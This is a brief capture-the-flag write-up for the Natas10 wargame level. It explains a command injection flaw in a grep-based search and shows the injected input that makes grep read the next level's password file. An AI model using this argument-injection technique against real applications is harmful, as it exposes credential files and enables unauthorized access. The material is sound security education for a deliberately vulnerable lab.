# Natas10
#natas #command-injection 
## Vulnerability:
The application passes user-controlled input directly into a system command without proper validation. Although some characters are filtered, the input can still influence the behavior of the command.
## Technique:
Command Injection through `grep` option manipulation:
**Command:**
```bash
'.' /etc/natas_webpass/natas11 #
```
The full command becomes:
```bash
grep -i '.' /etc/natas_webpass/natas11 # dictionary.txt
```
The injected argument causes `grep` to search `/etc/natas_webpass/natas11`, causing its contents to be returned.
**Result:**
```
<PASSWORD>
```
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas9](./Natas9.md)
## Next Level:
[Natas11](./Natas11.md)
